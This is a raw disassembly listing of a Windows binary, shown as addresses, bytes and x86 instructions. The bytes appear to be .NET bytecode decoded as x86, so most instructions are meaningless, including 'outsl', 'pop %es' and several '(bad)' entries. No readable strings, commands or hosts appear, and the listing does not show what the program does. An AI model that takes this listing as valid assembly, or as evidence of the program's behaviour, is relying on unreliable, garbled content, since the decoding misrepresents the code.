  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 e2       	add    $0xe2720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 ea 21       	and    $0x21ea7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 54    	or     0x54721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 66    	or     0x66721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 7a             	or     0x7a(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 d8             	or     -0x28(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 d8             	or     -0x28(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 dc                	jb     0x40329f
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 e6             	or     %esi,-0x1a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 fa                	jb     0x4032e0
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 1a                	jb     0x40330c
  4032f2:	23 00                	and    (%eax),%eax
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 d8             	or     -0x28(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 30                	jb     0x40333e
  40330e:	23 00                	and    (%eax),%eax
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 38                	jb     0x40335c
  403324:	23 00                	and    (%eax),%eax
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 44                	jb     0x403374
  403330:	23 00                	and    (%eax),%eax
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 54                	jb     0x4034c1
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 5a             	adc    %esi,0x5a(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 a0 23    	or     0x23a07209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	ba 23 00 70 28       	mov    $0x28700023,%edx
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 e6             	or     %esi,-0x1a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 f2             	or     -0xe(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	02 24 00             	add    (%eax,%eax,1),%ah
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 e6                	jb     0x403517
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 10             	or     0x10(%edx),%dh
  403540:	24 00                	and    $0x0,%al
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 26             	adc    %esi,0x26(%edx)
  40362e:	24 00                	and    $0x0,%al
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
